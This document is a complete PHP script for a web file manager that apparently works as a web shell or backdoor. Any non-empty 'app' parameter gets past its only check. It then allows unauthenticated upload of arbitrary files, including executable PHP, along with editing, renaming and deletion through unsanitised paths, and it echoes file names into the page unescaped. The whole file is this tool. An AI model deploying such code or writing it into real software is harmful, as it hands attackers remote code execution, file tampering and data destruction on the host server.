<?php
if (!isset($_GET['app']) || empty($_GET['app'])) {
    http_response_code(403);
    exit('🛑 Missing "app" parameter.');
}

$path = '.';
if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = basename($_GET['file']);
    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        header("Location: ?app=" . $_GET['app']);
        exit;
    }
    echo "<h2>Editing: $filepath</h2>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit'>Save</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
    header("Location: ?app=" . $_GET['app']);
    exit;
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    rename($_GET['rename'], $_POST['newname']);
    header("Location: ?app=" . $_GET['app']);
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    unlink($_GET['delete']);
    header("Location: ?app=" . $_GET['app']);
    exit;
}

echo "<h2>File Manager</h2>";
echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <button type='submit'>Upload</button>
</form><hr>";

$files = scandir($path);
echo "<table border='1' cellpadding='5'><tr><th>File</th><th>Action</th></tr>";
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    echo "<tr><td>$file</td><td>";
    if (is_file($file)) {
        echo "<a href='?app=" . $_GET['app'] . "&file=$file'>Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?app=" . $_GET['app'] . "&rename=$file'>
        <input name='newname' value='$file'>
        <button type='submit'>Rename</button>
    </form> | ";
    echo "<a href='?app=" . $_GET['app'] . "&delete=$file' onclick='return confirm(\"Delete $file?\")'>Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
?>
